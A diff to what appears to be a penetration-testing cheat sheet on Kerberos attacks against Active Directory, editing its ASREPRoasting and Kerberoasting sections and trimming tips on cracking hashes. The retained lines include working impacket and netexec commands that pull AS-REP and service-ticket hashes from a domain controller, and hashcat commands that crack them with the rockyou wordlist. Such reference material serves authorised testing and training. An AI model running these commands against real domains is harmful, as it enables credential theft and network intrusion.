@@ -40,9 +40,8 @@ impacket-GetNPUsers domain.local/username -dc-ip $IP -no-pass
 netexec ldap $IP -u users.txt -p '' --asreproast asrep_hashes.txt
 ```
 
-## Crack ASREPRoast hashes
+## Hashcat ASREPRoast
 ```bash
-# hashcat (GPU, faster) OR john (CPU)
 hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
@@ -56,9 +55,8 @@ impacket-GetUserSPNs domain.local/username:password -dc-ip $IP -request
 netexec ldap $IP -u username -p password --kerberoasting kerberoast_hashes.txt
 ```
 
-## Crack Kerberoast hashes
+## Hashcat Kerberoast
 ```bash
-# hashcat (GPU, faster) OR john (CPU)
 hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
@@ -109,7 +107,7 @@ Targets user accounts with "Do not require Kerberos preauthentication" enabled. 
 1. Enumerate users (kerbrute, netexec, or rpcclient)
 2. Test users for ASREPRoastable accounts (GetNPUsers)
 3. Collect AS-REP hashes
-4. Crack hashes with hashcat or john
+4. Crack hashes
 
 **No credentials needed:** ASREPRoasting works without any domain credentials.
 
@@ -159,11 +157,6 @@ Faster to crack than Kerberoast hashes
 **Kerberoast hashes (mode 13100):**
 Format: krb5tgs
 May take longer depending on password complexity
-
-**Optimization:**
-- Use GPU for cracking (hashcat)
-- Start with common passwords and rules
-- Use targeted wordlists based on company/domain name
 
 ## Pass-the-Ticket Attacks
 
